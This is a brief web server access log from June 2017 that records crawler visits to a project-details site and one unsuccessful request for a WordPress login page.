157.55.39.239 - - [24/Jun/2017:09:03:18 +0530] "GET /project_details_view.php?id=766 HTTP/1.1" 200 14801 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.84 - - [24/Jun/2017:09:07:10 +0530] "GET /project_details_view.php?id=529 HTTP/1.1" 200 14361 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
64.233.173.47 - - [24/Jun/2017:09:10:25 +0530] "GET /project_details_view.php?id=1839 HTTP/1.1" 200 14071 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
157.55.39.239 - - [24/Jun/2017:09:10:36 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
35.184.189.105 - - [24/Jun/2017:09:13:10 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
202.46.48.145 - - [24/Jun/2017:09:13:48 +0530] "GET /project_details_view.php?id=585 HTTP/1.1" 200 14002 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
157.55.39.84 - - [24/Jun/2017:09:18:18 +0530] "GET /project_details_view.php?id=1588 HTTP/1.1" 200 14033 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
82.178.181.98 - - [24/Jun/2017:09:20:33 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.178.181.98 - - [24/Jun/2017:09:20:33 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
